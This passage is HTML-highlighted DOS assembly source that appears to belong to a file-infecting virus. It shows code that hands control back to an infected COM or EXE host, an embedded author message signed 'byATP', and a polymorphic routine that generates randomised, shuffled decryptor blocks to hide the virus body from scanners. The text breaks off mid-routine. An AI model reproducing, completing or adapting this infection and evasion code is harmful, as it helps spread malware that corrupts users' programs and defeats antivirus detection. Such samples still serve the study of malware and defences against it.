        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">com_restoration</span><span class="sc0">

</span><span class="sc5">exe_restoration</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">original_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; host cs reloc</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">original_ss</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; ss reloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">original_sp</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; original sp</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">original_ip</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; go to original EXE</span><span class="sc0">

</span><span class="sc5">com_restoration</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">; AX = 100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">original_file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">; restore original 3 bytes</span><span class="sc0">
                </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; push cs:100h</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">; zero ax too</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">; go to original com</span><span class="sc0">

</span><span class="sc5">com_or_exe</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Nuotando nel miele"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Accecati dalla luce"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Oppressi dalla liberta'"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Nauseati dai falsi e facili sorrisi"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Lottiamo per trovare qualcosa in cui credere."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Le note della rabbia e dell'instabilita'"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"sono il detonatore della voglia di proseguire..."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"...'CAUSE WE'RE ALIVE!"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"You'llKnowWhatNITROMeans!"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"byATP"</span><span class="sc0">

</span><span class="sc5">decr_jmps_tbl</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; offset to segment adjustment</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; offset to counter assignation</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; offset to pointer assignation</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; offset to decryptor modification</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; offset to decryption instruction</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; offset to pointer increment</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; offset to counter decrement and check</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; offset to the begin of virus body</span><span class="sc0">

</span><span class="sc5">decr_block_jmp</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; bx = offset from beginning of block jumping table</span><span class="sc0">
</span><span class="sc1">; si = running offset to substract</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; this subroutine creates a jmp short from the current decryptor position</span><span class="sc0">
</span><span class="sc1">; (recognized from SI value) to the selected next decryptor block (value</span><span class="sc0">
</span><span class="sc1">; got from [decr_jmps_tbl + bx]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">decr_jmps_tbl</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; get from the tbl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                             </span><span class="sc1">; where we must jump</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; calculate jump lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc0">                 </span><span class="sc1">; jmp short opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; store jump to next block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc5">oligo_algo</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; entry DX = initial pointer value, this is where encrypted stuff begins</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seg_bx_tspace</span><span class="sc0">           </span><span class="sc1">; point after virus body</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1ah</span><span class="sc0">                     </span><span class="sc1">; get system time count</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5050h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; generate the random value</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; depending on date and</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; time</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1ah</span><span class="sc0">                     </span><span class="sc1">; get date</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; AX contains random value</span><span class="sc0">
                                                </span><span class="sc1">; for the entire generation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">enc_chunk_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; bytes to be encrypted</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">continue_enc</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">finished_enc</span><span class="sc0">            </span><span class="sc1">; if zero it is finished</span><span class="sc0">
</span><span class="sc5">continue_enc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; if &lt;= 1xxh then finish it</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">last_chunk</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                 </span><span class="sc1">; else do a 200h chunk</span><span class="sc0">
</span><span class="sc5">last_chunk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; copy next 200h chunk</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; if zero then we are at the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">must_make_dec</span><span class="sc0">           </span><span class="sc1">; first 200h chunk, so we must</span><span class="sc0">
                                                </span><span class="sc1">; create the decryptor</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">encr_instr</span><span class="sc0">              </span><span class="sc1">; else just keep encrypting</span><span class="sc0">
                                                </span><span class="sc1">; 200h virus chunks</span><span class="sc0">
</span><span class="sc5">must_make_dec</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc0">                  </span><span class="sc1">; where will start later enc</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc0">                  </span><span class="sc1">; decryptor won't be encrypted</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc0">                  </span><span class="sc1">; put some random bytes in the</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; middle of the decryption</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; blocks</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; must stay in the 00h-70h area</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; 7 offset for blocks to create</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">decr_jmps_tbl</span><span class="sc0">

</span><span class="sc5">create_offsets</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">; random number</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; offset between 02h</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; and 09h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                          </span><span class="sc1">; each block on a</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">                              </span><span class="sc1">; different 10h block</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">                              </span><span class="sc1">; so they won't disturb</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                           </span><span class="sc1">; each other</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; + base where code is</span><span class="sc0">
                                                        </span><span class="sc1">; generated</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; add to base before</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; point on next offset</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">create_offsets</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; has the rnd value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                          </span><span class="sc1">; moving loops through</span><span class="sc0">
                                                        </span><span class="sc1">; the offsets table</span><span class="sc0">

</span><span class="sc5">move_offsets</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; get one from table to xchange</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">good_src_xchg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">good_src_xchg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; select the one to exchange</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; with</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">good_dst_xchg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">good_dst_xchg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">decr_jmps_tbl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; both source and destination</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; *2 since offsets are words</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; exchange the two blocks</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">; offsets</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">move_offsets</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decr_block_jmp</span><span class="sc0">          </span><span class="sc1">; first normal jump</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">1f0eh</span><span class="sc0">   </span><span class="sc1">; push cs, pop ds opcodes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc0">                 </span><span class="sc1">; cmpsw opcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">use_stringsi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">37h</span><span class="sc0">                  </span><span class="sc1">; aaa opcode</span><span class="sc0">
</span><span class="sc5">use_stringsi</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_change1b</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">; convert to scasw/aas</span><span class="sc0">
</span><span class="sc5">no_change1b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">        </span><span class="sc1">; put one byte garbage</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
